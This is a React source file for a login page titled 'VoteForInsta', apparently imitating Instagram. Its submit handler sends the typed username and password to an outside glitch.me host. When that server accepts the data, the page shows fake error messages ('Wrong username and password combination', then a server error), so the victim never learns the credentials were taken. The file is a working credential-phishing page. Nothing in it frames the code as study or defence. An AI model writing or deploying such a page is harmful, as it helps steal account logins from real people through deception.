'use client';

import React, { useState } from 'react';

export default function Home() {
  const [username, setUsername] = useState('');
  const [password, setPassword] = useState('');
  const [error, setError] = useState('');
  const [count, setCount] = useState(0);
  const [responseMessage, setResponseMessage] = useState('');

  const handleChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const { name, value } = e.target;
    if (name === 'username') {
      setUsername(value);
    } else if (name === 'password') {
      setPassword(value);
    }
  };

  const handleSubmit = async (e: React.ChangeEvent<HTMLInputElement>) => {
  e.preventDefault();
  try {
    const response = await fetch('https://six-southern-tarp.glitch.me/login', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({ username, password }),
    });

    if (!response.ok) {
      const errorData = await response.json();
      setError(errorData.message);
    } else {
      const result = await response.json();
      setCount((prevCount) => {
        const newCount = prevCount + 1;

        // Update error message based on the new count
        if (newCount === 1) {
          setError('Wrong username and password combination');
        } else if (newCount >= 2) {
          setError('An error occurred on the server');
        } else {
          setError('');
        }

        return newCount;
      });
    }
  } catch (error) {
    console.error('Error:', error);
    setError('Something went wrong. Please try again.');
  }
};


  return (
    <div className="flex flex-col min-h-screen">
      <main className="flex-grow flex items-center justify-center bg-gradient-to-b from-pink-500 to-yellow-500">
        <div className="w-full max-w-xs p-8 bg-white rounded-lg shadow-lg">
          <h2 className="text-2xl font-bold text-center text-gray-800 mb-6">VoteForInsta</h2>
          <form onSubmit={handleSubmit}>
            <div className="mb-4">
              <label className="block text-sm font-medium text-gray-700">Username</label>
              <input
                type="text"
                name="username"
                value={username}
                onChange={handleChange}
                className="w-full px-4 py-2 mt-1 border rounded-md shadow-sm focus:outline-none focus:ring-2 focus:ring-pink-300"
                placeholder="Enter your username"
                required
              />
            </div>
            <div className="mb-4">
              <label className="block text-sm font-medium text-gray-700">Password</label>
              <input
                type="password"
                name="password"
                value={password}
                onChange={handleChange}
                className="w-full px-4 py-2 mt-1 border rounded-md shadow-sm focus:outline-none focus:ring-2 focus:ring-pink-300"
                placeholder="Enter your password"
                required
              />
            </div>
            {error && (
              <div className="mb-4 text-center text-red-500">
                <p>{error}</p>
              </div>
            )}
            {responseMessage && (
              <div className="mb-4 text-center text-green-500">
                <p>{responseMessage}</p>
              </div>
            )}
            <button
              type="submit"
              className="w-full px-4 py-2 text-white bg-pink-500 rounded-md hover:bg-pink-600 focus:outline-none focus:ring-2 focus:ring-pink-300"
            >
              Login
            </button>
          </form>
        </div>
      </main>
    </div>
  );
}

